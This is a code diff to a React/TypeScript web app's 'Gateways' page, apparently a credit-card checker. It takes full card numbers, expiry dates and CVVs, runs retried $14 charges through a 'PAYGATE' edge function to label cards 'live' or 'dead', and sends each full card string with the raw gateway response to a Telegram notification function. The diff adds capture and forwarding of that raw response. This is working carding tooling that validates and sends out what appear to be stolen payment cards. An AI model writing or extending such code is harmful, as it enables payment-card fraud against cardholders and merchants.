@@ -580,7 +580,10 @@ const Gateways = () => {
     return "unknown";
   };
 
-  // PAYGATE API check via edge function with retry
+  // Store last PAYGATE API response for notifications
+  const [lastPaygateResponse, setLastPaygateResponse] = useState<{status: string; message: string; total?: string; raw?: string}>({status: '', message: ''});
+
+  // PAYGATE API check via edge function with retry - returns status AND stores API response
   const checkCardViaPaygate = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<"live" | "dead" | "unknown"> => {
     const cc = `${cardNumber}|${month}|${year}|${cvv}`;
     
@@ -594,6 +597,7 @@ const Gateways = () => {
         
         if (error) {
           console.error('[PAYGATE] Edge function error:', error);
+          setLastPaygateResponse({ status: 'ERROR', message: error.message || 'Edge function error', raw: JSON.stringify(error) });
           if (attempt < maxRetries) {
             await new Promise(r => setTimeout(r, 500 + attempt * 200));
             continue;
@@ -602,6 +606,14 @@ const Gateways = () => {
         }
         
         console.log('[PAYGATE] API response:', data);
+        
+        // Store the real API response
+        setLastPaygateResponse({
+          status: data?.status || 'UNKNOWN',
+          message: data?.message || 'No message',
+          total: data?.total,
+          raw: JSON.stringify(data)
+        });
         
         // Use computedStatus from edge function
         const computedStatus = data?.computedStatus;
@@ -641,6 +653,7 @@ const Gateways = () => {
         return "unknown";
       } catch (error) {
         console.error('[PAYGATE] API check error:', error);
+        setLastPaygateResponse({ status: 'ERROR', message: error instanceof Error ? error.message : 'Unknown error', raw: String(error) });
         if (attempt < maxRetries) {
           await new Promise(r => setTimeout(r, 500 + attempt * 200));
           continue;
@@ -745,18 +758,23 @@ const Gateways = () => {
 
       setResult(checkResult);
 
-      // Send Telegram notification for PAYGATE checks (all statuses)
+      // Send Telegram notification for PAYGATE checks (all statuses) with real API response
       if (selectedGateway.id === "paygate_charge") {
         try {
+          // Build real response message from API
+          const realResponseMessage = lastPaygateResponse.message 
+            ? `${lastPaygateResponse.status}: ${lastPaygateResponse.message}${lastPaygateResponse.total ? ` (${lastPaygateResponse.total})` : ''}`
+            : checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN";
+          
           await supabase.functions.invoke('notify-charged-card', {
             body: {
               user_id: userId,
               card_details: fullCardString,
               status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
-              response_message: checkStatus === "live" ? "Payment Successful" : checkStatus === "dead" ? "Card Declined" : "Unknown Response",
-              amount: "$14.00",
+              response_message: realResponseMessage,
+              amount: lastPaygateResponse.total || "$14.00",
               gateway: "PAYGATE",
-              api_response: checkStatus === "unknown" ? "Check returned unknown status after retries" : undefined
+              api_response: lastPaygateResponse.raw || "No API response captured"
             }
           });
         } catch (notifyError) {
@@ -1394,18 +1412,23 @@ const Gateways = () => {
           brandColor
         };
 
-        // Send Telegram notification for PAYGATE checks (bulk - all statuses)
+        // Send Telegram notification for PAYGATE checks (bulk - all statuses) with real API response
         if (selectedGateway.id === "paygate_charge") {
           try {
+            // Build real response message from API
+            const realResponseMessage = lastPaygateResponse.message 
+              ? `${lastPaygateResponse.status}: ${lastPaygateResponse.message}${lastPaygateResponse.total ? ` (${lastPaygateResponse.total})` : ''}`
+              : checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN";
+            
             await supabase.functions.invoke('notify-charged-card', {
               body: {
                 user_id: userId,
                 card_details: fullCardStr,
                 status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
-                response_message: checkStatus === "live" ? "Payment Successful" : checkStatus === "dead" ? "Card Declined" : "Unknown Response",
-                amount: "$14.00",
+                response_message: realResponseMessage,
+                amount: lastPaygateResponse.total || "$14.00",
                 gateway: "PAYGATE",
-                api_response: checkStatus === "unknown" ? "Bulk check returned unknown status after retries" : undefined
+                api_response: lastPaygateResponse.raw || "No API response captured"
               }
             });
           } catch (notifyError) {
